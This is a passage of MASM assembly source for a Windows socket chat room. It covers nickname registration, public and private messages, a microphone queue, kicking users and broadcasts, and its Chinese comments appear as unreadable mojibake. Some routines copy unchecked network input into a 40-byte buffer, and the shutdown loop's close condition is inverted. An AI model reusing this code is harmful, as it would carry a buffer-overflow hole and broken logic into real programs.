               ;���ǳ���ӵ����ݽṹ��
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     mov @dwSock,eax
                     .if @dwSock!=0
                       push esi
                       invoke lstrcmp,addr [esi].userName,_lpszName
                       pop esi

                       .if !eax
                           mov eax,@dwSock
                           mov @Ret,eax
                           .break
                       .endif
                     .endif
                     add esi,@dwLen
                     inc @dwCount
               .endw
               assume esi:nothing 
               mov eax,@Ret
               ret
_getSockByNickName  endp

delay    proc
         pushad
         mov ecx,3fffffffh
again:   
         loop again
         popad
         ret
delay    endp

;------------------------
; ���������յ�����
; ��ڲ�����sock����͵��øù��̵Ĵ��ھ��
; ���������տͻ��˴�����Ϣ���� 
; ��1��������@#@�С�,������¼ϵͳ
; ��2��������@!@���������뿪
; ��3��������@$@����������������
; ��4������Һã�@*#@��ҡ��������Դ��˵��
; ��5���������������@*$@���ġ�������������˵��
; ��6��������ô��������һ����@*!@���ġ����������ĵض�����˵��
;------------------------
_recvData    proc  hs,_dwPara
             local @dwLen
             local @dwCount
             local @hSock
             local @dwTemp

             mov lpszTalker,0
             mov bufDisplay,0
             invoke RtlZeroMemory,addr bufRecv,1024
             invoke recv,hs,addr bufRecv,1024,0  ;ȡ�ͻ��˴���������
             
             ;-------------------------------------------------------
             ;���ǳƣ���ʾ�����¿ͻ�,�������ݱ�������Ϊ������������@#@�С�
             ;-------------------------------------------------------


             invoke InString,1,addr bufRecv,addr NickNameMark
             .if eax
               invoke RtlZeroMemory,addr bufNickName,40
               invoke lstrcpy,addr bufNickName,addr bufRecv  
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               lea esi,bufNickName
               add esi,@dwLen
               mov byte ptr[esi],0
               invoke _checkIfUserIsExist,addr bufNickName
               .if eax  ;�û����Ѿ����ڣ�
                 invoke RtlZeroMemory,addr bufDisplay,2000
                 invoke lstrcat,addr bufDisplay,addr szErrorUserIsExist
                 invoke lstrcat,addr bufDisplay,addr BroadcastMark
                 invoke lstrlen,addr bufDisplay
                 invoke send,hs,addr bufDisplay,eax,0
                 ret
               .endif
               mov @dwCount,0
               mov @dwTemp,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;�����ݱ�ԭ�����͸����ߵ������û�
               .while @dwCount<MAX_SOCKET
                     .if [esi].hSocket!=0
                       push esi
                       invoke send,[esi].hSocket,addr bufRecv,@dwLen,0
                       pop esi
                     .endif
                     add esi,@dwTemp
                     inc @dwCount
               .endw

               invoke delay

               ;�������ݱ��ĸ��û����ص�ǰ�����û��б�
               ;ÿ����һ����΢��ͣһ�ᣬ���ݰ��������£�������@#@�С�
               mov @dwCount,0
               mov esi,offset lChatUsers
               .while @dwCount<MAX_SOCKET
                     push esi
                     mov eax,[esi].hSocket
                     .if eax && eax!=hs
                       invoke RtlZeroMemory,addr bufNickName,40              
                       invoke lstrcpy,addr bufNickName,addr [esi].userName
                       invoke lstrcat,addr bufNickName,addr NickNameMark
                       .if [esi].sex==1
                         invoke lstrcat,addr bufNickName,addr lpszSexA
                       .else
                         invoke lstrcat,addr bufNickName,addr lpszSexB
                       .endif
                       invoke lstrlen,addr bufNickName
                       invoke send,hs,addr bufNickName,eax,0
                       invoke delay
                     .endif
                     pop esi
                     inc @dwCount
                     add esi,@dwTemp
               
               .endw
               assume esi:nothing

               ;���Ա���뵽�û��б�����ݽṹ��
               sub @dwLen,5
               lea esi,bufRecv
               add esi,@dwLen
               invoke InString,1,esi,addr lpszSexA
               .if eax ;��
                 invoke _addUserSex,hs,TRUE
               .else   ;Ů
                 invoke _addUserSex,hs,FALSE
               .endif
               ;���ǳƼ��뵽�û��б�����ݽṹ��
               lea esi,bufRecv
               add esi,@dwLen
               mov byte ptr[esi],0
               invoke _addNickName,hs,addr bufRecv
               ;�ڷ������˽�������ʾ����
               invoke _refreshChatServer,_dwPara
               invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_SETSEL,-1,-1
               invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay
               ret
             .endif

             ;------------------------------------------
             ;������������,���ݱ�������Ϊ������������@$@��
             ;------------------------------------------

             invoke InString,1,addr bufRecv,addr MicOrderMark
             .if eax
               ;�������û�����������������
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               mov @dwCount,0
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;�����ݱ�ԭ�����͸����ߵ������û�
               .while @dwCount<MAX_SOCKET
                     push esi
                     .if [esi].hSocket!=0
                       invoke send,[esi].hSocket,addr bufRecv,@dwLen,0
                     .endif
                     pop esi
                     add esi,@dwTemp
                     inc @dwCount
               .endw
               assume esi:nothing

               ;�����û���sock���뵽��ǰ�����б���
               sub @dwLen,3
               lea esi,bufRecv
               add esi,@dwLen
               mov byte ptr[esi],0
               invoke _getSockByNickName,addr bufRecv
               mov @hSock,eax

               mov @dwCount,0
               mov esi,offset lMicUsers
               .while @dwCount<MAX_SOCKET
                   .if dword ptr [esi]==0
                       mov eax,@hSock
                       mov dword ptr [esi],eax
                       .break
                   .endif
                   inc @dwCount
                   add esi,4
               .endw
               inc dwMicOrders

               ;�ڷ������˽�������ʾ����
               invoke _refreshChatServer,_dwPara
               invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_SETSEL,-1,-1
               invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay
               ret
             .endif

             ;----------------------------
             ; �Դ��˵������ã�@*#@��
             ;----------------------------- 

             invoke InString,1,addr bufRecv,addr ToAllMark  
             .if eax
                invoke RtlZeroMemory,addr bufDisplay,2000
                invoke _getTalker,hs,addr lpszTalker
                invoke lstrcat,addr bufDisplay,addr lpszTalker     ;����
                invoke lstrcat,addr bufDisplay,addr lpszTo         ;��

                invoke lstrcat,addr bufDisplay,addr lpszToAll      ;���
                invoke lstrcat,addr bufDisplay,addr lpszSay        ;˵
                invoke lstrlen,addr bufRecv

                mov @dwLen,eax
                sub @dwLen,4
                mov esi,offset bufRecv
                add esi,@dwLen
                mov byte ptr [esi],0

                invoke lstrcat,addr bufDisplay,addr bufRecv
                invoke lstrcat,addr bufDisplay,addr lpszCrLf
                ;�ڷ������˽�������ʾ����
                invoke _refreshChatServer,_dwPara
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_SETSEL,-1,-1
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay

                ;�����ݷ��͵����ͻ���
                invoke lstrlen,addr bufDisplay
                mov @dwLen,eax
                mov @dwCount,0
                mov @dwTemp,sizeof USERINFO
                mov esi,offset lChatUsers
                assume esi:ptr USERINFO
                .while @dwCount<MAX_SOCKET
                     push esi
                     .if [esi].hSocket!=0
                       invoke send,[esi].hSocket,addr bufDisplay,@dwLen,0
                     .endif
                     pop esi
                     add esi,@dwTemp
                     inc @dwCount
                .endw
                assume esi:nothing
                ret
             .endif

             ;----------------------------
             ; ������˵������ã�@*$@���ġ�
             ;----------------------------- 

             invoke InString,1,addr bufRecv,addr PublicMark  
             mov @dwTemp,eax
             .if eax
                invoke RtlZeroMemory,addr bufDisplay,2000
                invoke _getTalker,hs,addr lpszTalker
                invoke lstrcat,addr bufDisplay,addr lpszTalker     ;����
                invoke lstrcat,addr bufDisplay,addr lpszTo         ;��
                
                mov esi,offset bufRecv
                add esi,@dwTemp
                add esi,3
                invoke lstrcat,addr bufDisplay,esi                 ;����
                invoke lstrcat,addr bufDisplay,addr lpszSay        ;˵
          
                mov esi,offset bufRecv
                add esi,@dwTemp
                dec esi
                mov byte ptr [esi],0
                invoke lstrcat,addr bufDisplay,addr bufRecv
                invoke lstrcat,addr bufDisplay,addr lpszCrLf

                ;�ڷ������˽�������ʾ����
                invoke _refreshChatServer,_dwPara
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_SETSEL,-1,-1
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay

                ;�����ݷ��͵����пͻ�
                invoke lstrlen,addr bufDisplay
                mov @dwLen,eax
                mov @dwCount,0
                mov @dwTemp,sizeof USERINFO
                mov esi,offset lChatUsers
                assume esi:ptr USERINFO
                .while @dwCount<MAX_SOCKET
                     push esi
                     mov eax,[esi].hSocket
                     .if eax
                       invoke send,[esi].hSocket,addr bufDisplay,@dwLen,0
                     .endif
                     pop esi
                     add esi,@dwTemp
                     inc @dwCount
                .endw
                assume esi:nothing
                ret
             .endif

             ;----------------------------
             ; ���������ĵ�˵������ã�@*!@���ġ�
             ;----------------------------- 

             invoke InString,1,addr bufRecv,addr PrivacyMark  
             mov @dwTemp,eax
             .if eax
                invoke RtlZeroMemory,addr bufDisplay,2000
                invoke _getTalker,hs,addr lpszTalker
                invoke lstrcat,addr bufDisplay,addr lpszTalker     ;����
                invoke lstrcat,addr bufDisplay,addr lpszTo         ;��
                
                mov esi,offset bufRecv
                add esi,@dwTemp
                add esi,3
                invoke RtlZeroMemory,addr bufNickName,40
                invoke lstrcpy,addr bufNickName,esi
                invoke lstrcat,addr bufDisplay,esi                 ;����
                invoke lstrcat,addr bufDisplay,addr lpszSecSay     ;���ĵ�˵��
          
                mov esi,offset bufRecv
                add esi,@dwTemp
                dec esi
                mov byte ptr [esi],0
                invoke lstrcat,addr bufDisplay,addr bufRecv
                invoke lstrcat,addr bufDisplay,addr lpszCrLf

                ;�ڷ������˽�������ʾ����
                invoke _refreshChatServer,_dwPara
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_SETSEL,-1,-1
                invoke SendDlgItemMessage,_dwPara,IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay


                ;�����ݷ��͵�ָ���Ķ���
                invoke _getSockByNickName,addr bufNickName
                mov @hSock,eax

                invoke lstrcat,addr bufDisplay,addr PrivacyMark
                invoke lstrlen,addr bufDisplay
                invoke send,@hSock,addr bufDisplay,eax,0
                ;�����Լ�
                invoke send,hs,addr bufDisplay,eax,0
                ret
             .endif

             ret
_recvData    endp

;------------------------
; �ͻ��˶��յ�����
; ��ڲ�����sock����͵��øù��̵Ĵ��ھ��
; �ͻ��˴ӷ������˽���������Ϣ���� 
; ��1��������@#@�С�,������¼ϵͳ
; ��2��������@!@���������뿪
; ��3��������@$@����������������
; ��4������Һã�@*#@���������Դ��˵��
; ��5���������������@*$@���ġ����������ĵض�����˵��
; ��6��������ô��������һ����@*!@���ġ�������������˵��
;------------------------
_recvDataClient    proc  hs,_dwPara
             local @dwLen,@dwTemp
             local @dwCount
             local @hSock

             mov lpszTalker,0
             mov bufDisplay,0

             invoke RtlZeroMemory,addr bufRecv,1024
             invoke recv,hs,addr bufRecv,1024,0  ;ȡ�������˴���������
             ;-------------------------------------------------------
             ;���ǳƣ���ʾ���¿ͻ�����Ự,�������ݱ�������Ϊ������������@#@�С�
             ;-------------------------------------------------------
             invoke InString,1,addr bufRecv,addr NickNameMark
             .if eax  
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,5
               mov esi,offset bufRecv
               add esi,@dwLen
               mov byte ptr [esi],0
               ret
             .endif

             ;-------------------------------------------------------
             ; ����Ա����ͨ��
             ;-------------------------------------------------------
             invoke InString,1,addr bufRecv,addr BroadcastMark
             .if eax  
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,4
               mov esi,offset bufRecv
               add esi,@dwLen
               mov byte ptr [esi],0
               ;�����û����뵽��Ͽ���
               invoke MessageBox,_dwPara,\
                         addr bufRecv,addr szErrorBroadcast,MB_OK
               ret
             .endif

             ;------------------------------------------
             ;������������,���ݱ�������Ϊ������������@$@��
             ;------------------------------------------

             invoke InString,1,addr bufRecv,addr MicOrderMark
             .if eax
               ;�������û�����������������
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               mov @dwCount,0
               mov @dwTemp,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;�����ݱ�ԭ�����͸����ߵ������û�
               .while @dwCount<MAX_SOCKET
                     push esi
                     .if [esi].hSocket!=0
                       invoke send,[esi].hSocket,addr bufRecv,@dwLen,0
                     .endif
                     pop esi
                     add esi,@dwTemp
                     inc @dwCount
               .endw
               assume esi:nothing

               ;�����û���sock���뵽��ǰ�����б���
               sub @dwLen,3
               lea esi,bufRecv
               add esi,@dwLen
               mov byte ptr[esi],0
               invoke _getSockByNickName,addr bufRecv
               mov @hSock,eax

               mov @dwCount,0
               mov esi,offset lMicUsers
               .while @dwCount<MAX_SOCKET
                   .if dword ptr [esi]==0
                       mov eax,@hSock
                       mov dword ptr [esi],eax
                       .break
                   .endif
                   inc @dwCount
                   add esi,4
               .endw
               inc dwMicOrders
               ret
             .endif
             ret
_recvDataClient    endp

;------------------------------
; ���»Ự������״̬
;------------------------------
_updateStatus   proc _dwParam
                invoke _initChatServer,_dwParam
                invoke _clearChatServerView
                ret
_updateStatus   endp

_initChatClient  proc _dwPara
                 local @dwTemp

                 invoke CreateEvent,NULL,TRUE,FALSE,NULL
                 mov hEvent,eax
                
                 invoke lstrcpy,addr bufNickName,addr bufClientAdmin
                 invoke lstrcat,addr bufNickName,addr NickNameMark
                 invoke lstrcat,addr bufNickName,addr lpszSexA

                 invoke socket,AF_INET,SOCK_STREAM,0
                 mov hClientSocket,eax
                 invoke WSAAsyncSelect,hClientSocket,_dwPara,WM_SOCKETCLIENT,\
                        FD_CONNECT or FD_WRITE or FD_READ or FD_CLOSE
                 
                 invoke htons,CHAT_TCP_PORT
                 mov stSourceAddr.sin_port,ax
                 mov stSourceAddr.sin_family,AF_INET
                 invoke inet_addr,addr bufLocalIP
                 mov stSourceAddr.sin_addr.S_un.S_addr,eax
                 invoke connect,hClientSocket,addr stSourceAddr,sizeof stSourceAddr 

                 ;�ڿͻ���Ϊ�û��б���ӡ���ҡ��û�
                 invoke SendDlgItemMessage,_dwPara,\
                         IDC_CHATOBJECT,CB_ADDSTRING,0,addr lpszToAll
                 invoke SendDlgItemMessage,_dwPara,\
                         IDC_CHATOBJECT,CB_SETCURSEL,0,0
                 mov dwCurrentSelUser,0
                 invoke CheckDlgButton,_dwPara,IDC_PRIVACY,\
                         FALSE
                 mov dwPrivacyTalk,0
                 invoke GetDlgItem,_dwPara,IDC_PRIVACY
                 invoke EnableWindow,eax,FALSE 
                 ret
_initChatClient  endp

_sendMessageToServer  proc  hs,_dwPara
                 local @dwTemp,@dwTemp1
                 local @szBuffer[40]:byte

                 ;���Լ�˵
                 invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                        CB_GETCURSEL,0,0
                 mov ebx,eax
                 invoke RtlZeroMemory,addr @szBuffer,40
                 invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                        CB_GETLBTEXT,ebx,addr @szBuffer
                 invoke lstrlen,addr @szBuffer
                 mov @dwTemp,eax
                 invoke lstrlen,addr bufClientAdmin
                 mov @dwTemp1,eax
                 invoke InString,1,addr bufClientAdmin,addr @szBuffer
                 mov ebx,@dwTemp1
                 .if eax && ebx==@dwTemp
                    invoke MessageBox,_dwPara,addr szErrorToSelf,NULL,MB_OK
                    ret
                 .endif 
 
                 ;�Դ�ҹ���,�����256���ַ�
                 .if dwCurrentSelUser==0
                    invoke GetDlgItemText,_dwPara,IDC_CHATMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr ToAllMark
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    ret
                 .endif
        
                 ;��ĳ�˹���
                 .if dwCurrentSelUser && !dwPrivacyTalk
                    
                    invoke GetDlgItemText,_dwPara,IDC_CHATMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr PublicMark
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                           CB_GETCURSEL,0,0
                    mov ebx,eax
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                           CB_GETLBTEXT,ebx,addr @szBuffer
                    invoke lstrcat,addr bufDisplay,addr @szBuffer
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    ret
                 .endif

                 ;��ĳ��˽��
                 .if dwCurrentSelUser && dwPrivacyTalk
                    invoke GetDlgItemText,_dwPara,IDC_CHATMESSAGE,addr bufDisplay,256
                    invoke lstrcat,addr bufDisplay,addr PrivacyMark
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                           CB_GETCURSEL,0,0
                    mov ebx,eax
                    invoke SendDlgItemMessage,_dwPara,IDC_CHATOBJECT,\
                           CB_GETLBTEXT,ebx,addr @szBuffer
                    invoke lstrcat,addr bufDisplay,addr @szBuffer
                    invoke lstrlen,addr bufDisplay
                    invoke send,hs,addr bufDisplay,eax,0
                    ret
                 .endif

                 ret
_sendMessageToServer  endp


;--------------------------
; �Ự�������˴��ڳ���
;--------------------------
_ProcChatServerMain   proc  uses ebx edi esi hProcessChatServerDlg:HWND,wMsg,wParam,lParam
          local @dwDestLen,@dwLen,@dwTemp
          local @dwCount
          local @hSock

          mov @dwDestLen,sizeof sockaddr_in

          .if wMsg==WM_CLOSE
             ;�ر������׽���
             invoke closesocket,hSocket
             ;�ر�ȫ������
             mov @dwCount,0
             mov @dwTemp,sizeof USERINFO
             mov esi,offset lChatUsers
             assume esi:ptr USERINFO

             ;�ر�ȫ������
             .while @dwCount<MAX_SOCKET
                push esi
                mov eax,[esi].hSocket
                .if !eax
                   invoke closesocket,eax
                .endif
                pop esi
                add esi,@dwTemp
                inc @dwCount
             .endw
             assume esi:nothing 
             invoke WSACleanup
             ;�رմ���
             invoke EndDialog,hProcessChatServerDlg,NULL
          .elseif wMsg==WM_INITDIALOG
             mov dwTotalUsers,0
             mov dwFilterUsers,0
             mov dwMuteUsers,0
             mov dwIPDisabled,0
             mov dwMicOrders,0

             invoke RtlZeroMemory,addr lChatUsers,MAX_SOCKET*(sizeof USERINFO)
             invoke RtlZeroMemory,addr lFilterUsers,MAX_SOCKET*4
             invoke RtlZeroMemory,addr lMuteUsers,MAX_SOCKET*4
             invoke RtlZeroMemory,addr lMicUsers,MAX_SOCKET*4
             invoke RtlZeroMemory,addr lDisabledIP,MAX_SOCKET*15

             invoke GetDlgItem,hProcessChatServerDlg,IDC_CHATUSERS
             mov hChatServerTable,eax
             invoke SendMessage,hChatServerTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hChatServerTable,SW_SHOW
             ;��Ϣ������Ϊֻ��
             invoke SendDlgItemMessage,hProcessChatServerDlg,\
                    IDC_FILTERWINDOW,EM_SETREADONLY,TRUE,NULL

             invoke _updateStatus,hProcessChatServerDlg

             invoke _initChatClient,hProcessChatServerDlg

          .elseif wMsg==WM_SOCKETCLIENT  ;�Ự�ͻ�������
             mov eax,lParam
             .if ax==FD_CONNECT  ;�����������
                 shr eax,16
                 .if ax
                   invoke closesocket,hClientSocket
                 .else
                   invoke lstrlen,addr bufNickName
                   invoke send,hClientSocket,addr bufNickName,eax,0
                 .endif
             .elseif ax==FD_READ
                 invoke _recvDataClient,wParam,hProcessChatServerDlg
             .elseif ax==FD_WRITE
                 invoke SetEvent,hEvent
             .elseif ax==FD_CLOSE
                 invoke closesocket,hClientSocket
             .endif
          .elseif wMsg==WM_SOCKET
             mov eax,lParam
             .if ax==FD_ACCEPT  ;���ܿͻ��˵���������
                 invoke RtlZeroMemory,addr stDestAddr,@dwDestLen
                 invoke accept,wParam,addr stDestAddr,addr @dwDestLen
                 invoke _addClient,eax,hProcessChatServerDlg
             .elseif ax==FD_READ
                 invoke _recvData,wParam,hProcessChatServerDlg
             .elseif ax==FD_CLOSE
                 invoke _removeClient,wParam,hProcessChatServerDlg
             .endif
          .elseif wMsg==WM_COMMAND
             mov eax,wParam
             ;shr eax,16
             .if ax==IDC_KICKDOWN    ;������

               ;�õ������û���SOCK ID�������������߳�֪ͨ
               invoke RtlZeroMemory,addr bufNickName,40
               invoke _GetListViewItem,hChatServerTable,dwChatServerLineIndex,1,\
                        addr bufNickName
               invoke _getSockByNickName,addr bufNickName
               mov @hSock,eax
               invoke RtlZeroMemory,addr bufDisplay,2000
               invoke lstrcat,addr bufDisplay,addr lpszYou
               invoke lstrcat,addr bufDisplay,addr szErrorKickDown 
               invoke lstrcat,addr bufDisplay,addr BroadcastMark
               invoke lstrlen,addr bufDisplay
               mov @dwLen,eax

               invoke send,@hSock,addr bufDisplay,@dwLen,0

               ;�Ͽ����û�������
               invoke closesocket,@hSock

               ;�������û����ͶԷ�����֪ͨ
               invoke RtlZeroMemory,addr bufDisplay,2000
               invoke lstrcat,addr bufDisplay,addr bufNickName
               invoke lstrcat,addr bufDisplay,addr QuitMark
               invoke lstrlen,addr bufDisplay
               mov @dwLen,eax
               mov @dwCount,0
               mov @dwTemp,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO
               .while @dwCount<MAX_SOCKET
                   push esi
                   .if [esi].hSocket!=0
                     invoke send,[esi].hSocket,addr bufDisplay,@dwLen,0
                   .endif
                   mov eax,@hSock
                   .if [esi].hSocket==eax
                      mov [esi].hSocket,0
                   .endif
                   pop esi
                   add esi,@dwTemp
                   inc @dwCount
               .endw
               assume esi:nothing

               invoke _refreshChatServer,hProcessChatServerDlg
               invoke SendDlgItemMessage,hProcessChatServerDlg,\
                      IDC_FILTERWINDOW,EM_SETSEL,-1,-1
               invoke SendDlgItemMessage,hProcessChatServerDlg,\
                      IDC_FILTERWINDOW,EM_REPLACESEL,0,addr bufDisplay

             .elseif ax==IDC_CHATOBJECT  ;�û�ѡ�����������
               invoke SendDlgItemMessage,hProcessChatServerDlg,IDC_CHATOBJECT,\
                      CB_GETCURSEL,0,0
               mov dwCurrentSelUser,eax
               .if eax==0  ;�������Ϊ���
                  ;��˽������Ϊ��ѡ
                  invoke CheckDlgButton,hProcessChatServerDlg,IDC_PRIVACY,\
                         FALSE
                  mov dwPrivacyTalk,0
                  invoke GetDlgItem,hProcessChatServerDlg,IDC_PRIVACY
                  invoke EnableWindow,eax,FALSE 
               .else
                  invoke CheckDlgButton,hProcessChatServerDlg,IDC_PRIVACY,\
                         TRUE
                  mov dwPrivacyTalk,1
                  invoke GetDlgItem,hProcessChatServerDlg,IDC_PRIVACY
                  invoke EnableWindow,eax,TRUE 
               .endif
             .elseif ax==IDC_PRIVACY    ;˽�İ�ť������Ժ�
               invoke IsDlgButtonChecked,hProcessChatServerDlg,IDC_PRIVACY
               .if eax==BST_CHECKED
                  mov dwPrivacyTalk,0
                  invoke CheckDlgButton,hProcessChatServerDlg,IDC_PRIVACY,\
                         FALSE
               .else
                  mov dwPrivacyTalk,1
                  invoke CheckDlgButton,hProcessChatServerDlg,IDC_PRIVACY,\
                         TRUE
               .endif
             .elseif ax==IDC_SENDMESSAGE  ;�ͻ����������������Ϣ
               invoke _sendMessageToServer,hClientSocket,hProcessChatServerDlg
             .elseif ax==IDC_BROADCAST    ;֪ͨ���пͻ�
               invoke RtlZeroMemory,addr bufDisplay,2000
               invoke GetDlgItemText,hProcessChatServerDlg,IDC_CHATMESSAGE,\
                      addr bufDisplay,256
               invoke lstrcat,addr bufDisplay,addr BroadcastMark
               invoke lstrlen,addr bufDisplay
               mov @dwLen,eax
               mov @dwCount,0
               mov @dwTemp,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO
               .while @dwCount<MAX_SOCKET
                   push esi
                   .if [esi].hSocket!=0
                     invoke send,[esi].hSocket,addr bufDisplay,@dwLen,0
                   .endif
                   pop esi
                   add esi,@dwTemp
                   inc @dwCount
               .endw
               assume esi:nothing
             .elseif ax==IDC_APPLYMIC

             .elseif ax==IDC_SETFILTER

             .elseif ax==IDC_STOPSERVICE   ;ֹͣ����
                 invoke SendMessage,hProcessChatServerDlg,WM_CLOSE,0,0
             .endif
         .elseif wMsg==WM_NOTIFY   ;����ؼ������ĸ���֪ͨ��
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hChatServerTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwChatServerLineIndex,eax   ;��
                .endif
            .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_ProcChatServerMain    endp


;--------------------
; ��ʼ���û��б�
;--------------------
_clearUsersView  proc uses ebx ecx
             invoke _ListViewClear,hChatClientTable

             ;��ӱ�ͷ
             mov ebx,1
             mov eax,146
             lea ecx,lpszUsersHeader
             invoke _ListViewAddColumn,hChatClientTable,ebx,eax,ecx
             mov dwCount,0
             ret
_clearUsersView  endp


;--------------------
; �������û��б������һ���û�
; �õ���dwCount��Ϊ�м���
;--------------------
_addUsersOnLine proc uses ebx ecx _lpszText,_type 
          local @lvi:LV_ITEM

          invoke RtlZeroMemory,addr @lvi,sizeof LV_ITEM
          mov @lvi.imask,LVIF_TEXT+LVIF_PARAM+LVIF_IMAGE
          push dwCount
          pop @lvi.iItem
          mov @lvi.iSubItem,0
          push _lpszText
          pop @lvi.pszText
          push _type
          pop @lvi.iImage
          push dwCount
          pop @lvi.lParam
          invoke SendMessage,hChatClientTable,LVM_INSERTITEM,0,addr @lvi                          
          ret
_addUsersOnLine endp

;------------------------
; �ͻ��˴ӷ������˽��յ�����
; ��ڲ�����sock����͵��øù��̵Ĵ��ھ��
; �ͻ��˴ӷ������˽���������Ϣ���� 
; ��1��������@#@�С�,������¼ϵͳ
; ��2��������@!@���������뿪
; ��3��������@$@����������������
; ��4������Һã�@*#@���������Դ��˵��
; ��5���������������@*$@���ġ����������ĵض�����˵��
; ��6��������ô��������һ����@*!@���ġ�������������˵��
;------------------------
_recvDataFromServer   proc  hs,_dwPara
             local @dwLen,@dwTemp
             local @dwCount
             local @hSock,@dwType
             local @lpLFI:LVFINDINFO

             mov lpszTalker,0
             mov bufDisplay,0

             invoke RtlZeroMemory,addr bufRecv,1024
             invoke recv,hs,addr bufRecv,1024,0  ;ȡ�������˴���������
 
             ;-------------------------------------------------------
             ;���ǳƣ���ʾ���¿ͻ�����Ự,�������ݱ�������Ϊ������������@#@�С�
             ;-------------------------------------------------------
             invoke InString,1,addr bufRecv,addr NickNameMark
             .if eax  
               invoke RtlZeroMemory,addr bufNickName,40
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,2
               mov esi,offset bufRecv
               add esi,@dwLen
               invoke lstrcpy,addr bufNickName,esi
               invoke lstrcmp,addr bufNickName,addr lpszSexA
               .if !eax
                  mov @dwType,2
               .else
                  mov @dwType,3
               .endif

               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,5
               mov esi,offset bufRecv
               add esi,@dwLen
               mov byte ptr [esi],0

               invoke lstrcmp,addr bufRecv,addr bufClientAdmin
               .if !eax
                 mov @dwType,0   ;ϵͳ����Ա
               .endif


               ;�����û����뵽��Ͽ���б���
               inc dwCount
               invoke _addUsersOnLine,addr bufRecv,@dwType

               invoke SendDlgItemMessage,_dwPara,\
                         IDC_CHATTO,CB_ADDSTRING,0,addr bufRecv

               mov eax,dwCount
               invoke SetDlgItemInt,_dwPara,IDC_TOTALUSER,eax,FALSE
               ret
             .endif

             ;-------------------------------------------------------
             ; ����Ա����ͨ��
             ;-------------------------------------------------------
             invoke InString,1,addr bufRecv,addr BroadcastMark
             .if eax  
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,4
               mov esi,offset bufRecv
               add esi,@dwLen
               mov byte ptr [esi],0
               invoke MessageBox,_dwPara,\
                         addr bufRecv,addr szErrorBroadcast,MB_OK
               invoke InString,1,addr bufRecv,addr szErrorKickDown
               .if eax
                 invoke WSACleanup
                 invoke EndDialog,_dwPara,NULL
               .endif
               ret
             .endif

             ;-------------------------------------------------------
             ; ˽����Ϣ
             ;-------------------------------------------------------

             invoke InString,1,addr bufRecv,addr PrivacyMark  
             mov @dwTemp,eax
             .if eax
                mov esi,offset bufRecv
                add esi,@dwTemp
                dec esi
                mov byte ptr [esi],0
                invoke SendDlgItemMessage,_dwPara,IDC_PRIVACYMESSAGE,EM_SETSEL,-1,-1
                invoke SendDlgItemMessage,_dwPara,IDC_PRIVACYMESSAGE,EM_REPLACESEL,0,addr bufRecv
                ret
             .endif

             ;------------------------------------------
             ;�����뿪,���ݱ�������Ϊ������������@!@��
             ;------------------------------------------
             invoke InString,1,addr bufRecv,addr QuitMark
             .if eax
               ;�������û�����������������
               invoke lstrlen,addr bufRecv
               mov @dwLen,eax
               sub @dwLen,3
               lea esi,bufRecv
               add esi,@dwLen
               mov byte ptr[esi],0

               
               ;���û��б�,�û�ѡ����Ͽ��е���Ӧ�û�ɾ��,������1
               invoke RtlZeroMemory,addr @lpLFI,sizeof @lpLFI
               mov @lpLFI.flags,LVFI_STRING
               mov @lpLFI.psz,offset bufRecv

               invoke SendDlgItemMessage,_dwPara,\
                      IDC_USERSLIST,LVM_FINDITEM,-1,addr @lpLFI
               .if eax!=-1
                 invoke SendDlgItemMessage,_dwPara,\
                        IDC_USERSLIST,LVM_DELETEITEM,eax,0
                 dec dwCount
               .endif
               invoke SendDlgItemMessage,_dwPara,\
                         IDC_CHATTO,CB_FINDSTRING,0,addr bufRecv
               .if eax!=CB_ERR
                   invoke SendDlgItemMessage,_dwPara,IDC_CHATTO,CB_DELETESTRING,eax,0
               .endif
               mov eax,dwCount
